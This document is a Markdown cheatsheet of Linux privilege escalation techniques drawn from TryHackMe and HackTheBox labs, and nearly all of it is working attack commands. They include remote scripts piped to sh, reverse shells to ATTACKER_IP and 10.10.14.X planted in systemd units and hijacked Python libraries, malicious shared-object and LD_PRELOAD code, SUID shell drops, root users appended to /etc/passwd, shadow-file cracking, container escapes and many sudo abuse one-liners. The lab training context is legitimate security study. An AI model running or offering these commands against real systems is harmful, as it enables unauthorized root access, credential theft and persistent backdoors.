---
title: Linux Privilege Escalation Cheatsheet
type: cheatsheet
tags:
  - capabilities
  - cheatsheet
  - cron
  - docker
  - htb
  - linux
  - lxd
  - privesc
  - python-hijack
  - sudo
  - suid
  - thm
date_created: 2026-05-08
date_updated: 2026-05-13
sources:
  - thm-linux-privesc
  - thm-python-lib-hijack
  - thm-lxd
  - git-htb-writeups
  - 0xdf-linux-privesc
---

## Automated enumeration

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or download and run
wget http://ATTACKER_IP:8000/linpeas.sh -O /dev/shm/linpeas.sh
sh /dev/shm/linpeas.sh | tee /dev/shm/result.txt

# LinEnum
wget http://ATTACKER_IP:8000/LinEnum.sh | bash

# Linux Exploit Suggester (kernel exploits)
wget https://github.com/The-Z-Labs/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
sh linux-exploit-suggester.sh
```

---

## System information

```bash
uname -a                           # kernel version
cat /etc/issue; cat /etc/os-release   # OS info
id; whoami; groups                 # current user and groups
hostname
env                                # environment variables
cat /proc/version
```

---

## SUID / SGID binaries

```bash
# Find SUID binaries
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -type f -perm -02000 -ls 2>/dev/null

# Check GTFOBins for exploitation: https://gtfobins.github.io/

# Common SUID GTFOBins examples:

# bash SUID
/bin/bash -p                       # -p preserves elevated euid

# find SUID
find / -name file -exec /bin/sh \; -quit

# vim SUID
vim -c ':!/bin/sh'

# zip SUID (TomGhost / EritSecurus pattern)
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

# nmap SUID (old versions)
nmap --interactive
!sh

# python SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## Sudo rights

```bash
sudo -l                            # list allowed commands

# GTFOBins for sudo: https://gtfobins.github.io/#sudo

# yum sudo (DailyBugle pattern)
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os,yum
from yum.plugins import PluginYumExit,TYPE_CORE,TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y

# zip sudo
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

# python sudo
sudo python -c 'import pty;pty.spawn("/bin/bash")'

# awk sudo
sudo awk 'BEGIN {system("/bin/sh")}'

# less sudo
sudo less /etc/passwd
!/bin/sh
```

---

## LD_PRELOAD (sudo with env_keep)

```bash
# Compile malicious shared object
cat > /tmp/priv.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles

# Execute with env_keep for LD_PRELOAD
sudo LD_PRELOAD=/tmp/priv.so apache2   # any allowed sudo binary
```

---

## Shared object injection (SUID binary)

```bash
# Find missing shared objects
strace /usr/local/bin/suid-binary 2>&1 | grep -i -E "open|access|no such file"

# Create the missing .so
mkdir -p /home/user/.config
cat > /home/user/.config/libcalc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-binary    # triggers .so load
```

---

## PATH hijacking (SUID env variable abuse)

```bash
# Find SUID binary calling command without full path
strings /usr/local/bin/suid-env   # look for e.g. "service" without /usr/bin/service

# EXAMPLE 1: binary calls "service" without full path
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env

# EXAMPLE 2: binary calls "/usr/sbin/service" (full path)
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2

# EXAMPLE 3: BASH_ENV trick
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' \
  /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

---

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities
# cap_setuid+ep on python/python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid+ep on perl
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search on tar
tar -czf /dev/null /root/   # read any file
```

---

## Cron job exploitation

```bash
# View crontab
cat /etc/crontab
crontab -l
ls -la /etc/cron.*

# Writable cron script — overwrite to add SUID bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh
# Wait for cron to run, then:
/tmp/bash -p

# Append to writable cron script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
/tmp/bash -p

# Wildcard injection (tar in /home/user/)
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
chmod +x /home/user/runme.sh
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh runme.sh'
# Wait for cron tar with wildcard to run
/tmp/bash -p
```

---

## /etc/passwd writable

```bash
# If /etc/passwd is writable, add root user
openssl passwd -1 -salt abc password123   # generates hash

# Append new root user
echo 'hacker:GENERATED_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: password123
```

---

## /etc/shadow weak permissions

```bash
ls -la /etc/shadow

# If readable, unshadow and crack
unshadow /etc/passwd /etc/shadow > /tmp/hash.txt
hashcat -m 1800 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
# or john
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
```

---

## NFS no_root_squash

```bash
# Check NFS exports on target
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# From attacker (root):
showmount -e TARGET_IP
mkdir /tmp/nfs_mount
mount -o rw,vers=2 TARGET_IP:/tmp /tmp/nfs_mount

# Create SUID binary on NFS share (executes as root on target)
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs_mount/exploit.c
gcc /tmp/nfs_mount/exploit.c -o /tmp/nfs_mount/exploit
chmod +s /tmp/nfs_mount/exploit

# On target
/tmp/exploit
id  # uid=0(root)
```

---

## Kernel exploits

```bash
# Check kernel version
uname -r
uname -a

# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# DirtyCow (CVE-2016-5195) — works on kernels 2.6.22 to 4.8.3
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd   # trigger the exploit
id       # should show root
```

---

## Docker group escape

```bash
# Check if user is in docker group
id | grep docker
groups | grep docker

# Mount host root into Alpine container and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now have root access to host filesystem
```

## Docker — Privileged Container / cap_sys_admin Escape

```bash
# Check if in privileged container or cap_sys_admin
cat /proc/self/status | grep CapEff
# or: ls -la /.dockerenv

# cap_sys_admin escape via cgroup release_agent
mkdir /tmp/cgroup
mount -t cgroup -o rdma cgroup /tmp/cgroup
mkdir /tmp/cgroup/x

echo 1 > /tmp/cgroup/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)" > /tmp/cgroup/release_agent
# Append to release_agent:
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > /tmp/output" >> /cmd
chmod +x /cmd
echo "/cmd" > /tmp/cgroup/release_agent

# Trigger
echo $$ > /tmp/cgroup/x/cgroup.procs

# Privileged container — mount host disk directly
fdisk -l        # find host disk (e.g. /dev/sda1)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

---

## Writable Systemd Services / Timers

```bash
# Find writable service files
find / -writable -name "*.service" 2>/dev/null

# Modify to run payload
# Edit [Service] section:
# ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'

systemctl daemon-reload
systemctl restart <service_name>

# Find writable timers
find / -writable -name "*.timer" 2>/dev/null
```

---

## LXD group escape

```bash
# Check if user is in lxd group
id | grep lxd

# On attacker: build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder; bash build-alpine
# Transfer .tar.gz to target

# On target
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Now inside container with host filesystem at /mnt/root
cat /mnt/root/etc/shadow
```

---

## Python library hijacking

```bash
# Scenario: SUID or sudo script uses Python and imports a library
# Find Python library paths
python3 -c "import sys; print(sys.path)"

# Find writable Python libraries
find / -name "*.py" -writable 2>/dev/null
find / -path /proc -prune -o -path /sys -prune -o -name "*.py" -writable -print 2>/dev/null

# Find libraries writable by current group
find / -group GROUPNAME -type f 2>/dev/null

# If /usr/lib/python3.8/base64.py is writable and a root cron uses base64:
# Add reverse shell to the module's __init__ or top-level code
vim /usr/lib/python3.8/base64.py
# Add: import os; os.system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")

# If /usr/lib/python3.8/shutil.py is writable (Dreaming CTF pattern):
vim /usr/lib/python3.8/shutil.py
# Add reverse shell payload at top of file; wait for cron calling restore.py
```

---

## Stored credentials

```bash
# Bash history
cat ~/.bash_history | grep -i passw
history

# Config files
cat /home/user/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat ~/.irssi/config | grep -i passw

# Web application config
cat /var/www/html/wp-config.php         # WordPress
cat /var/www/html/configuration.php    # Joomla
cat /var/www/html/fuel/application/config/database.php  # Fuel CMS

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

---

## Common CTF privilege escalation patterns

```bash
# Blog CTF: SUID binary calls env var
ltrace /usr/sbin/checker          # reveals: getenv("admin")
export admin=1
/usr/sbin/checker                 # spawns root shell

# Valley CTF: writable Python library used by root cron
find / -name "base64.py" -writable 2>/dev/null
# Add reverse shell payload to base64.py

# Dreaming CTF: writable shutil.py + cron calling restore.py
find / -group death -type f 2>/dev/null
vim /usr/lib/python3.8/shutil.py  # inject payload

# GamingServer CTF: user in lxd group → LXD escape (see above)
```

---

## From-the-wild HTB one-liners

Drawn from 25 HTB Easy/Medium Linux machines. See [[linux-privesc]] for full chains and context.

```bash
# sudo journalctl (Traverxec) — shrink terminal, less opens, then:
!/bin/bash

# sudo composer (Academy)
TF=$(mktemp -d); echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json; sudo composer --working-dir=$TF run-script x

# sudo knife (Knife)
sudo knife exec -E "exec '/bin/bash'"

# sudo ssh ProxyCommand (CozyHosting)
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# sudo neofetch + XDG_CONFIG_HOME (Meta)
echo 'exec /bin/sh' > ~/.config/neofetch/config.conf; XDG_CONFIG_HOME=~/.config sudo neofetch

# sudo pip3 install with malicious setup.py (SneakyMailer)
sudo pip3 install .                        # setup.py cmdclass={'install': Exploit} runs as root

# sudo snap install hook (Armageddon)
sudo snap install --devmode evil.snap      # snap/hooks/install runs as root

# CVE-2019-14287 sudo -u#-1 bypass (Blunder, sudo < 1.8.28, (ALL,!root))
sudo -u#-1 /bin/bash

# sudo PYTHONPATH hijack via SETENV (Admirer)
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6   # rogue shutil.py in /var/tmp

# sudo terraform dev_overrides (Previous)
echo 'provider_installation { dev_overrides { "x.htb/x/x" = "/dev/shm" } direct {} }' > ~/.terraformrc
sudo terraform -chdir=/opt/examples apply

# sudo + script PATH hijack (Previse — gzip; Photobomb — find/[)
PATH=/dev/shm:$PATH sudo /opt/scripts/access_backup.sh   # /dev/shm/gzip is malicious

# sudo + ACL symlink (PermX)
ln -s /etc/passwd /home/$USER/passwd; sudo /opt/acl.sh $USER rwx passwd
echo 'oxdf:$1$x$hash:0:0::/root:/bin/bash' >> /etc/passwd; su oxdf

# wildcard cp argument injection in sudo'd script (Dynstr)
cp /bin/bash .; chmod 4777 bash; touch -- --preserve=mode; sudo /usr/local/bin/bindmgr.sh
/etc/bind/named.bindmgr/bash -p

# Upstart writable conf (Spectra) — add 'exec /bin/bash' to script block
echo 'script\n  exec /bin/bash -c "..."\nend script' >> /etc/init/test.conf; sudo initctl start test

# cron tar -h symlink dereference race (Epsilon)
cd /opt/backups; while :; do test -f checksum && { rm -f checksum; ln -s /root checksum; break; }; sleep 1; done

# cron pg_basebackup SUID drop (Slonik) — as postgres in data dir
cp /bin/bash ~/14/main/; chmod 6777 ~/14/main/bash
# wait for cron; then:
/opt/backups/current/bash -p

# cron ansible-parallel writable tasks dir (Inject)
cat > /opt/automation/tasks/0xdf.yml << 'EOF'
- hosts: localhost
  tasks:
    - shell: cp /bin/bash /tmp/0xdf; chmod 4755 /tmp/0xdf
EOF
# wait for cron, then: /tmp/0xdf -p

# cap_setuid+ep python (Cap)
python3 -c 'import os, pty; os.setuid(0); pty.spawn("/bin/bash")'

# cap_setuid+ep perl with AppArmor bypass (Nunchucks)
printf '#!/usr/bin/perl\nuse POSIX qw(setuid);POSIX::setuid(0);exec "/bin/sh";\n' > /tmp/a.pl
chmod +x /tmp/a.pl; /tmp/a.pl

# cap_sys_ptrace+ep gdb (Faculty)
gdb -q -p <root_pid>   # then: set {long}($rip+N) = 0xWORD; c   (inject shellcode)

# SUID jjs Nashorn (Mango)
echo 'var fw=new (Java.type("java.io.FileWriter"))("/root/.ssh/authorized_keys");fw.write("ssh-rsa AAAA...");fw.close();' | jjs

# binwalk CVE-2022-4510 path traversal (Pilgrimage)
python walkingpath.py ssh root.png ~/.ssh/id_ed25519.pub
scp binwalk_exploit.png user@target:/var/www/.../shrunk/   # root inotifywait+binwalk -e runs it
```

---

## Quick wins checklist

```bash
sudo -l                                    # sudo rights (read SETENV flag carefully!)
sudo --version                             # < 1.8.28 -> try -u#-1 if (ALL,!root)
find / -perm -u=s -type f 2>/dev/null      # SUID
/usr/sbin/getcap -r / 2>/dev/null          # capabilities (try absolute path)
cat /etc/crontab                           # cron jobs
ls -la /etc/init/                          # Upstart configs (legacy)
ls -la /etc/systemd/system/                # systemd services
./pspy64                                   # discover hidden cron + service exec
find / -writable -type f 2>/dev/null | grep -v proc  # writable files
ls -la /etc/passwd /etc/shadow             # world-writable config?
id                                         # group memberships (docker, lxd, disk, staff, debug)
uname -r                                   # kernel version for exploits
env                                        # interesting env vars / tokens
find / -name "*.py" -writable 2>/dev/null  # python library hijack
find / -name "*.yml" -writable 2>/dev/null # ansible playbook hijack
```

## sudo scp -> root (GTFOBins, non-interactive)

`sudo -l` shows `(ALL) NOPASSWD: /usr/bin/scp`. scp's `-S <prog>` option runs `<prog>` as the SSH
transport program, i.e. as root. Interactive shell (GTFOBins):

```sh
TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:
```

Non-interactive / scripted (works over a one-shot SSH command, no TTY): point `-S` at a script that
escalates, then use the result:

```sh
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/p.sh; chmod +x /tmp/p.sh
timeout 6 sudo scp -S /tmp/p.sh /etc/hostname x:/tmp/z   # scp then errors, but /tmp/p.sh already ran as root
bash -p -c id                                            # euid=0(root)
```

Wrap the `sudo scp` in `timeout` so the fake transport can't hang the session. Revert afterwards:
`chmod u-s /bin/bash`. See GTFOBins `scp` (sudo).

<!-- promoted-slug: sudo-scp-gtfobins -->
